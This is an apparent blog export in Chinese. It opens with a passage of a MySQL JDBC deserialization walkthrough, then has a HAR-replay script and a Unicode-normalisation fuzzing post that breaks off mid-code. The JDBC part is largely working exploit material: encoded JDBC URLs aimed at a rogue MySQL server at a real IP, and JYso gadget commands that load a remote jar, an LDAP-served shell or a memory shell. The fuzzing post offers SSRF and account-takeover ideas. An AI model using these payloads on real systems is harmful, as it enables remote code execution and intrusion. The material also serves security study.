<h2 id="修改Payload直接执行命令"><a href="#修改Payload直接执行命令" class="headerlink" title="修改Payload直接执行命令"></a>修改Payload直接执行命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/jdbctest?exp=jdbc%3Amysql%3A%2F%2F117.72.39.110%3A60003%2Ftest%3FautoDeserialize%3Dtrue%26statementInterceptors%3Dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user%3Ddeser_CC31_open%20-a%20Calculator&amp;user=ro&amp;password=123</span><br></pre></td></tr></table></figure>

<p>观察下payload，由于此处是在url中传参，所以上步需要将jdbc连接字符串url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://xxx:60003/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator</span><br></pre></td></tr></table></figure>
<p>此处CC31实际上是CC3.1，也就是CC6的链。</p>
<p>成功执行命令：<code>open -a Calculator</code><br><img src="/images/Pasted%20image%2020240716162436.png"></p>
<h3 id="Tips-未知Gadget利用DNSLOG进行探测"><a href="#Tips-未知Gadget利用DNSLOG进行探测" class="headerlink" title="Tips: 未知Gadget利用DNSLOG进行探测"></a>Tips: 未知Gadget利用DNSLOG进行探测</h3><p>针对真实网络情况下，无法快速判断Gadget利用链，可使用Jyso生成序列化数据，使用dnslog进行快速获取支持链。</p>
<p>使用Jyso生成Dnslog链：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ~/tools/jyso/JYso-<span class="number">3.5</span>.jar -yso <span class="number">1</span> -g URLDNS -p <span class="string">&quot;all:lod8w01rxs32k4caie1wiqpsajge44st.oastify.com&quot;</span> | base64 -w <span class="number">0</span> &gt; gadget.txt</span><br></pre></td></tr></table></figure>

<p>使用fake-mysql-cli创建服务端，并且指定gadget内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar fake-mysql-cli-0.0.4.jar -f gadget.txt -p 60003</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240717103354.png"></p>
<p>选择deser_CUSTOM选择自定义的gadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/jdbctest?exp=jdbc%3Amysql%3A%2F%2F117.72.39.110%3A60003%2Ftest%3FautoDeserialize%3Dtrue%26statementInterceptors%3Dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user%3Ddeser_CUSTOM&amp;user=ro&amp;password=123</span><br></pre></td></tr></table></figure>

<p>成功获取dnslog，支持链指向：cc31或cc321<br><img src="/images/Pasted%20image%2020240717103643.png"></p>
<p>注意：若程序判断目标系统内无可用Gadget链，则可能无法收到dnslog，此时可使用常规dnslog链对目标进行探测，以排查是否存在反序列化利用点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;JD-ldap://117.72.39.110:60007/SpringController/shell/-t cmd&quot; | base64 -w 0 &gt; gadget.txt</span><br><span class="line"></span><br><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;JD-ldap://117.72.39.110:60007/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==&quot; | base64 -w 0 &gt; gadget.txt</span><br><span class="line"></span><br><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;RC-http://117.72.39.110:60006/DateUtil.jar#DateUtil&quot; | base64 -w 0 &gt; gadget.txt</span><br><span class="line"></span><br><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;EX-MS-SpringControllerMS-cmd&quot; | base64 -w 0 &gt; gadget.txt</span><br></pre></td></tr></table></figure>

<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><h2 id="What-is-Jdbc"><a href="#What-is-Jdbc" class="headerlink" title="What is Jdbc"></a>What is Jdbc</h2><p>JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。  </p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Mysql JDBC 中包含一个危险的扩展参数： “autoDeserialize”。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。</p>
<p>此外通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被<code>ObjectInputStream.readObject()</code>进行反序列化处理。</p>
<p>所以若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发<code>ObjectInputStream.readObject()</code>，构造反序列化利用链即可造成RCE。  </p>
<h2 id="JDBC反序列化入口链"><a href="#JDBC反序列化入口链" class="headerlink" title="JDBC反序列化入口链"></a>JDBC反序列化入口链</h2><h3 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h3><p>此链涉及Jdbc多版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.29-5.1.48：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.0.2-6.0.6：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br></pre></td></tr></table></figure>

<h3 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.1.0-5.1.10：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  连接后需执行查询</span><br><span class="line"></span><br><span class="line">5.1.11-5.x.xx：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.x：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  （包名中添加cj）</span><br><span class="line"></span><br><span class="line">8.0.20以下：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><h3 id="0x01-环境介绍"><a href="#0x01-环境介绍" class="headerlink" title="0x01 环境介绍"></a>0x01 环境介绍</h3><p>此次分析使用的mysql-connector-java版本是5.1.29</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.29<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 版本号可以根据需要修改 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>连接语句，可参照上方环境部署</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// url为可自定义地址</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password); </span><br></pre></td></tr></table></figure>

<h3 id="0x02-代码流程"><a href="#0x02-代码流程" class="headerlink" title="0x02 代码流程"></a>0x02 代码流程</h3><ul>
<li>自定义jdbc连接，查看执行流程<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/root?detectCustomCollations=true%26autoDeserialize=true%26user=root&amp;password=&amp;password=root1234</span><br></pre></td></tr></table></figure>
<img src="/images/Pasted%20image%2020240802052209.png"></li>
</ul>
<p>请求连接：<a href="http://localhost:8776/jdbctest?exp=jdbc:mysql://127.0.0.1:3306/root?detectCustomCollations=true&autoDeserialize=true&user=root&password=&password=root1234">http://localhost:8776/jdbctest?exp=jdbc:mysql://127.0.0.1:3306/root?detectCustomCollations=true%26autoDeserialize=true%26user=root&amp;password=&amp;password=root1234</a></p>
<p>跟进getConnection方法：java.sql.DriverManager#getConnection(java.lang.String, java.lang.String, java.lang.String)<br><img src="/images/Pasted%20image%2020240802053309.png"></p>
<p>接着调用getConnection：<code>java.sql.DriverManager#getConnection(java.lang.String, java.util.Properties, java.lang.Class&lt;?&gt;)</code><br><img src="/images/Pasted%20image%2020240802053523.png"></p>
<p>向下走，调用到<code>java.sql.Driver#connect</code>，跟进去<br><img src="/images/Pasted%20image%2020240802053625.png"></p>
<p>进入到：<code>com.mysql.jdbc.NonRegisteringDriver#connect</code><br><img src="/images/Pasted%20image%2020240802053702.png"></p>
<p>如果url不为空，则进入第一个if语句，并且url以<code>jdbc:mysql:loadbalance://</code>或以<code>jdbc:mysql:replication://</code>开头则进入<code>com.mysql.jdbc.NonRegisteringDriver#connectLoadBalanced</code>或<code>com.mysql.jdbc.NonRegisteringDriver#connectReplicationConnection</code><br>显然此处都不符合：<br><img src="/images/Pasted%20image%2020240802054306.png"></p>
<p>接着又来几个if，不需要管，向下走，跟进入<code>com.mysql.jdbc.ConnectionImpl#getInstance</code><br><img src="/images/Pasted%20image%2020240802054733.png"></p>
<p><code>com.mysql.jdbc.ConnectionImpl#getInstance</code>中调用了<code>com.mysql.jdbc.Util#handleNewInstance</code><br><img src="/images/Pasted%20image%2020240802054927.png"></p>
<p>ctor反射调用<code>class com.mysql.jdbc.JDBC4Connection</code>并传入args参数<br><img src="/images/Pasted%20image%2020240802055029.png"></p>
<p><code>com.mysql.jdbc.JDBC4Connection#JDBC4Connection</code>使用<code>super</code>执行父类，也就是<code>com.mysql.jdbc.ConnectionImpl#ConnectionImpl(java.lang.String, int, java.util.Properties, java.lang.String, java.lang.String)</code><br><img src="/images/Pasted%20image%2020240802060251.png"></p>
<p>向下翻多加几个断点，不必要的地方直接跳过，跳到<code>com.mysql.jdbc.ConnectionImpl#createNewIO</code>步入进去（不要问为什么是这，文章都是这么写的[哭]）<br>进入后我这里调用了<code>com.mysql.jdbc.ConnectionImpl#connectOneTryOnly</code><br><img src="/images/Pasted%20image%2020240802062931.png"></p>
<p>向下走调用<code>com.mysql.jdbc.ConnectionImpl#initializePropsFromServer</code>，这个方法解析连接参数中<code>statementInterceptors</code>参数并添加相应类至当前对象<code>statementInterceptors</code>属性<br><img src="/images/Pasted%20image%2020240802063337.png"></p>
<p>接着<code>com.mysql.jdbc.ConnectionImpl#loadServerVariables</code>在2222行调用了<code>com.mysql.jdbc.ConnectionImpl#loadServerVariables</code><br><img src="/images/Pasted%20image%2020240802071345.png"></p>
<p>跟进<code>com.mysql.jdbc.ConnectionImpl#loadServerVariables</code><br>程序为query赋值，接下来调用<code>java.sql.Statement#executeQuery</code>并传入query的值<br><img src="/images/Pasted%20image%2020240802071531.png"></p>
<p><code>com.mysql.jdbc.StatementImpl#executeQuery</code>通过一系列处理，再次调用到<code>com.mysql.jdbc.MySQLConnection#execSQL(com.mysql.jdbc.StatementImpl, java.lang.String, int, com.mysql.jdbc.Buffer, int, int, boolean, java.lang.String, com.mysql.jdbc.Field[])</code><br><img src="/images/Pasted%20image%2020240802071731.png"></p>
<p>继续看<code>execSQL</code>，又调用了<code>com.mysql.jdbc.ConnectionImpl#execSQL(com.mysql.jdbc.StatementImpl, java.lang.String, int, com.mysql.jdbc.Buffer, int, int, boolean, java.lang.String, com.mysql.jdbc.Field[], boolean)</code><br><img src="/images/Pasted%20image%2020240802071832.png"></p>
<p><code>execSQL</code>方法中再次调用<code>com.mysql.jdbc.MysqlIO#sqlQueryDirect</code>并传入值（如图）<br><img src="/images/Pasted%20image%2020240802071946.png"></p>
<p>1750行：执行sql语句<code>SHOW SESSION STATUS</code>获取返回内容<br><img src="/images/Pasted%20image%2020240802072935.png"></p>
<p>1915行：调用<code>com.mysql.jdbc.StatementInterceptorV2#preProcess</code>代码进入<code>com.mysql.jdbc.NoSubInterceptorWrapper#preProcess</code>接着再调用<code>com.mysql.jdbc.StatementInterceptor#preProcess</code><br><img src="/images/Pasted%20image%2020240802074509.png"></p>
<p>进入<code>com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</code>调用<code>com.mysql.jdbc.Util#resultSetToMap(java.util.Map, java.sql.ResultSet)</code><br><img src="/images/Pasted%20image%2020240802074627.png"></p>
<p>接下来就是<code>getObject</code>开始反序列化了<br><img src="/images/Pasted%20image%2020240802074751.png"></p>
<p>跟进getObject，搜索readObject下断点，实际上此处<code>objIn</code>就是我们伪造的数据库给出的数据了。<br><img src="/images/Pasted%20image%2020240802075018.png"></p>
<p>步过触发反序列化造成RCE<br><img src="/images/Pasted%20image%2020240802075106.png"></p>
<p>大致流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getObject:5017, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">resultSetToMap:500, Util (com.mysql.jdbc)</span><br><span class="line">populateMapWithSessionStatusValues:75, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:92, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:58, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">preProcess:71, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPre:3007, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:2671, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:2828, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:2777, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:1651, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:4215, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:3609, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:2550, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:2320, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:834, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:46, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:423, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:411, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:416, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:347, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:664, DriverManager (java.sql)</span><br><span class="line">getConnection:247, DriverManager (java.sql)</span><br><span class="line">getDataFromRemoteDB:19, jdbcController (com.example.jdbcspring.controller)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor">https://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor</a></li>
<li><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></li>
</ul>
]]></content>
      <tags>
        <tag>Jdbc, 反序列化, Java</tag>
      </tags>
  </entry>
  <entry>
    <title>手机抓包导出HAR文件进行二次请求</title>
    <url>/2024/07/04/%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E5%AF%BC%E5%87%BAHAR%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>HAR：一般为多条数据包请求及响应内容，通常为json格式<br><img src="/images/20240115140300.png"></p>
<p>使用简便python进行解析并模拟访问（此代码将127.0.0.1:8080设置为了代理地址）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">fdata = <span class="built_in">open</span>(<span class="string">&#x27;1.har&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = json.loads(fdata.read())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="string">&#x27;log&#x27;</span>][<span class="string">&#x27;entries&#x27;</span>]:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    head = &#123;&#125;</span><br><span class="line">    cunzai = []</span><br><span class="line">    <span class="keyword">if</span> i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;method&#x27;</span>] == <span class="string">&quot;GET&quot;</span> <span class="keyword">and</span> i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;url&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> cunzai:</span><br><span class="line">        url = i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;headers&#x27;</span>]:</span><br><span class="line">            head[<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a[<span class="string">&#x27;name&#x27;</span>])] = a[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        head[<span class="string">&#x27;token&#x27;</span>] = <span class="string">&#x27;ec4ec339374c4d0492295606a9e3f846&#x27;</span></span><br><span class="line">        head[<span class="string">&#x27;urlVerif&#x27;</span>] = <span class="string">&#x27;IP2MEmotBHZe1iTq1EGsZLd46vl4f7I26rhLm/IufU+CGgLbALbpQHRuYVIATOms4JjLY8BHDALSIa6lDqLX6A==&#x27;</span></span><br><span class="line">        requests.get(url=url,</span><br><span class="line">                     headers=head,</span><br><span class="line">                     verify=<span class="literal">False</span>,</span><br><span class="line">                     proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line">        cunzai.append(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;method&#x27;</span>] == <span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;url&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> cunzai:</span><br><span class="line">            url = i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;headers&#x27;</span>]:</span><br><span class="line">                head[<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a[<span class="string">&#x27;name&#x27;</span>])] = a[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            head[<span class="string">&#x27;token&#x27;</span>] = <span class="string">&#x27;ec4ec339374c4d0492295606a9e3f846&#x27;</span></span><br><span class="line">            head[<span class="string">&#x27;urlVerif&#x27;</span>] = <span class="string">&#x27;IP2MEmotBHZe1iTq1EGsZLd46vl4f7I26rhLm/IufU+CGgLbALbpQHRuYVIATOms4JjLY8BHDALSIa6lDqLX6A==&#x27;</span></span><br><span class="line">            requests.post(url=url, </span><br><span class="line">                        headers=head,</span><br><span class="line">                        data=<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i[<span class="string">&#x27;request&#x27;</span>][<span class="string">&#x27;postData&#x27;</span>][<span class="string">&#x27;text&#x27;</span>]),</span><br><span class="line">                        verify=<span class="literal">False</span>,</span><br><span class="line">                        proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line">            cunzai.append(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>,url)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>WEB渗透中你意想不到的模糊测试方法</title>
    <url>/2025/06/05/WEB%E6%B8%97%E9%80%8F%E4%B8%AD%E4%BD%A0%E6%84%8F%E6%83%B3%E4%B8%8D%E5%88%B0%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="字符转换的FUZZ"><a href="#字符转换的FUZZ" class="headerlink" title="字符转换的FUZZ"></a>字符转换的FUZZ</h1><p>来一个案例：</p>
<p>现代应用程序和 API 依赖于验证、清理和规范化。这通常是通过自定义正则表达式和广泛使用的库来完成的，这些库验证和转换典型的用户输入格式，例如电子邮件地址、URL 等。</p>
<p>一个后端案例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.<span class="keyword">match</span>(<span class="string">r&quot;^\S+@\S+\.\S+$&quot;</span>, <span class="string">&quot;aa.com&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.<span class="keyword">match</span>(<span class="string">r&quot;^\S+@\S+\.\S+$&quot;</span>, <span class="string">&quot;a@a.com&quot;</span>)</span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">7</span>), <span class="keyword">match</span>=<span class="string">&#x27;a@a.com&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>或者php的转义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; <span class="title function_ invoke__">htmlspecialchars</span>(<span class="string">&quot;input&#x27;\&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">= <span class="string">&quot;input&amp;#039;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>大家可能都听说过sql注入的二次注入，想象一个功能点：</p>
<p>一个注册点：可以让你输入邮箱或者昵称等，用邮箱为例子，但你在输入邮箱时显然没办法让服务器存储你的恶意的内容吧：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello&#x27;@a.com</span><br></pre></td></tr></table></figure>

<p>又或者你肯定没办法注册一个别人注册过的邮箱吧：<br>想到这里可以参考一个CTF题目：<code>https://buuoj.cn/challenges#[HCTF%202018]admin</code></p>
<p>还是上面的邮箱:<code>hello@a.com</code><br>如果我们输入的是：<code>hello@ª.com</code></p>
<p>那么是否可以注册出一个<code>hello@ª.com</code>用户呢？<br>如果可以，在后端的某一次的处理中，如果将<code>hello@ª.com</code>进行转换并存储时，我们有没有可能达到越权或者接管的效果呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(unidecode.unidecode(<span class="string">&quot;hello@ª.com&quot;</span>))</span><br><span class="line">=&gt;</span><br><span class="line">hello@a.com</span><br></pre></td></tr></table></figure>

<p>再看几个例子：<br>下面的php代码转换完事后有没有可能造成二次sql注入呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;ASCII//TRANSLIT&quot;</span>, <span class="string">&quot;Ãéï°úç&quot;</span>);</span><br><span class="line">= <span class="string">&quot;~A&#x27;e\&quot;i^0&#x27;uc&quot;</span></span><br></pre></td></tr></table></figure>

<p>再来一个明显的例子：谷歌浏览器<br>当我们搜索<code>ª</code>，那会搜索到什么呢？<br><img src="/images/Pasted%20image%2020250522092337.png"></p>
<p>同样的道理，这个地址，看似乱七八糟的，能访问到吗？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://🅂𝖍𝐤ₛᵖ𝒓.ⓜ𝕠𝒃𝓲/🆆🆃🅵/</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020250522092414.png"></p>
<p>实际上显然是可以访问到的，浏览器在帮我们访问时做了一次转换，那么别人的SSRF的Payload也就很好理解了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</span><br></pre></td></tr></table></figure>

<p>来一个替代方案list表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨</span><br><span class="line">⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ </span><br><span class="line">Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ </span><br><span class="line">ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<p>同样了鄙人也用ai写了一个转换脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">stylize</span>(<span class="params">text, style</span>):</span><br><span class="line">    styles = &#123;</span><br><span class="line">        <span class="string">&quot;script&quot;</span>:       (<span class="string">&quot;𝒶&quot;</span>, <span class="string">&quot;𝒜&quot;</span>, <span class="number">0x1D4B6</span>, <span class="number">0x1D49C</span>),  <span class="comment"># a/A</span></span><br><span class="line">        <span class="string">&quot;bold&quot;</span>:         (<span class="string">&quot;𝐚&quot;</span>, <span class="string">&quot;𝐀&quot;</span>, <span class="number">0x1D41A</span>, <span class="number">0x1D400</span>),</span><br><span class="line">        <span class="string">&quot;italic&quot;</span>:       (<span class="string">&quot;𝑎&quot;</span>, <span class="string">&quot;𝐴&quot;</span>, <span class="number">0x1D44E</span>, <span class="number">0x1D434</span>),</span><br><span class="line">        <span class="string">&quot;bold_italic&quot;</span>:  (<span class="string">&quot;𝒂&quot;</span>, <span class="string">&quot;𝑨&quot;</span>, <span class="number">0x1D482</span>, <span class="number">0x1D468</span>),</span><br><span class="line">        <span class="string">&quot;fraktur&quot;</span>:      (<span class="string">&quot;𝖆&quot;</span>, <span class="string">&quot;𝕬&quot;</span>, <span class="number">0x1D51E</span>, <span class="number">0x1D504</span>),</span><br><span class="line">        <span class="string">&quot;double&quot;</span>:       (<span class="string">&quot;𝕒&quot;</span>, <span class="string">&quot;𝔸&quot;</span>, <span class="number">0x1D552</span>, <span class="number">0x1D538</span>),</span><br><span class="line">        <span class="string">&quot;monospace&quot;</span>:    (<span class="string">&quot;𝚊&quot;</span>, <span class="string">&quot;𝙰&quot;</span>, <span class="number">0x1D68A</span>, <span 